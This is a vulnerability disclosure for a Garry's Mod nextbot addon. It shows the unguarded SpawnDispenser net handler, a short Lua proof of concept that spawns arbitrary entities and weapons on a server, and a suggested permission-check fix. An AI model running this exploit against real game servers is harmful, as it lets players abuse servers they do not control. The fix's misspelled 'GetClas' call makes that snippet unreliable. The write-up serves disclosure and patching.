# Summe's Nextbot Net Exploit
Found by OverlordAkise on 2021.08.19  
Addon can be bought in some obscure discord server


Summe's Nextbot addon has a Net Exploit in the `SummeNextbots.Spawn*` net.Receive functions.

### TL;DR
The addon doesn't verify anything in the specified net.Receive function.  
The net.Receive function takes a spawn position, entity list and simply spawns it where the player wants it to.  

### The Code
This is the shortened but otherwise unchanged Code that is responsible for the Exploit:
```LUA 
net.Receive("SummeNextbots.SpawnDispenser", function(len, ply)
    local pos = net.ReadVector()
    local data = net.ReadTable()
    local model = net.ReadString()
    local hp = net.ReadUInt(15)
    local shouldFall = net.ReadBool()
    local data_ = {}

    for k, v in pairs(data) do
        for i = 1, v do
            table.insert(data_, k)
        end
    end

    if shouldFall then
        --[ nearly the same as below ]--
    else
        local pod = ents.Create("summe_dispenser_landed")
        pod:SetPos(pos)
        pod.TargetPos = pos
        pod.NPCList = data_
        pod:Spawn()
        pod:SetModel(model)
        pod:SetMaxHealth(hp)
        pod:SetHealth(hp)
        --[ undo for player ]--
    end
end)
```

### The Problem
The receiving function doesn't check if the player who sends this message is actually holding the toolgun or has permission to use it.  
This means that a player can send any data (e.g. entities the SpawnDispenser should spawn) and the server will simply oblige.  


### Example Code
The easiest way to demonstrate this would be the following code:  
```LUA
net.Start("SummeNextbots.SpawnDispenser")
    net.WriteVector(LocalPlayer():GetEyeTrace().HitPos+Vector(0,0,20))
    net.WriteTable({["manhack_welder"] = 1, ["weapon_smg1"] = 1})
    net.WriteString("models/Kleiner.mdl")
    net.WriteUInt(100,15)
    net.WriteBool(false)
net.SendToServer()
```  
This spawns a T-posing Dr.Kleiner and makes him spawn a manhack- and smg1-gun.  
You could also spawn this anywhere on the map and not only where the player is looking, because it takes a vector via `net.ReadVector` instead serverside the EyeTrace of the player.  


### Fixing the exploit
It would be enough to check if the player who sent the net message has the toolgun in hand. This could be done like the following example, but a simple `if not ply:IsAdmin() then return end` would also be enough if players should never use this toolgun anyways.

Change the first lines of the net.Receive function to this:
```LUA
net.Receive("SummeNextbots.SpawnDispenser", function(len, ply)
    local wep = ply:GetActiveWeapon()
    if not IsValid(wep) or wep:GetClas() ~= "gmod_tool" then return end
    local pos = net.ReadVector()
    --[ rest of the code ]--
    --...
```  
  
This doesn't fix the exploit if someone already has a toolgun, but on the servers I have been seeing this addon on (e.g. Star Wars themed) it doesn't matter because normal users never get a toolgun, which would make this a very easy and simple fix.  
